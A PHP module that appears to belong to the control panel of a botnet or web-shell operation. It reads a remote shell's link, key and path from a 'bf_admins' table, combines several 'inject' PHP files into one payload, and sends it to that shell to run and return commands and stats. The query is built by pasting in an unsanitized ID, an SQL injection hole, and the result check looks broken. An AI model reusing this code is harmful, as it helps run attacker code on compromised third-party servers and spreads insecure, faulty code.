<?php
include_once('modules/admins/country_code.php');
//$smarty->assign('country_code', $country_code);
$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));

function country_s($countrys){	global $country_code;
	$countrys = explode('|', $countrys);
	foreach($countrys as &$code){		$code = $country_code[$code];
	}
	$countrys = implode('<br />', $countrys);
	print($countrys);
}

if(!empty($Cur['id'])){	$result = $mysqli->query("SELECT id, link, keyid, shell FROM bf_admins WHERE (id='".$Cur['id']."')");
	if($result->id == $Cur['id']){		$get_php = '$delete_id = \''.$Cur['x'].'\';';
		$get_php .= '$cur_file = \''.$result->shell.'\';';
		$get_php .= file_get_contents('modules/admins/injects/start.php');
		$get_php .= file_get_contents('modules/admins/injects/mysqli.php');
		$get_php .= file_get_contents('modules/admins/injects/functions.php');
		$get_php .= file_get_contents('modules/admins/injects/get_rc.php');
		$get_php .= file_get_contents('modules/admins/injects/cmd_stats_cmd.php');
		$cmds = get_http($result->link, $get_php, $result->keyid, $result->shell);
		$smarty->assign('admin', $result);
		$smarty->assign('cmds', json_decode($cmds));
	}
}

?>